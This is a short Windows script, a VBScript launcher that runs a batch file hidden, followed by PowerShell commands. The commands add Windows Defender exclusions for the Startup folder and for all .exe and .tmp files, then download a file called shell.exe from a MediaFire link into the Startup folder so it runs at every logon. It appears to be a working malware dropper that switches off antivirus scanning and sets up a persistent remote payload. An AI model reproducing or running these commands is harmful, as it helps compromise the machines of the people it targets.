Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\Batch Files\syncfiles.bat" & Chr(34), 0
Set WshShell = Nothing
powershell -command Add-MpPreference -ExclusionPath "C:\Users\lohit\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\"
powershell -command Add-MpPreference -ExclusionExtension ".tmp"
powershell -command Add-MpPreference -ExclusionExtension ".exe"
powershell -command Add-MpPreference -ExclusionProcess "C:\Users\lohit\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\shell.exe\"
cd "C:\Users\lohit\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
powershell -command Start-BitsTransfer "https://download1481.mediafire.com/he5d591zxntg/mpkirdq6taeo4l0/shell.exe"
pause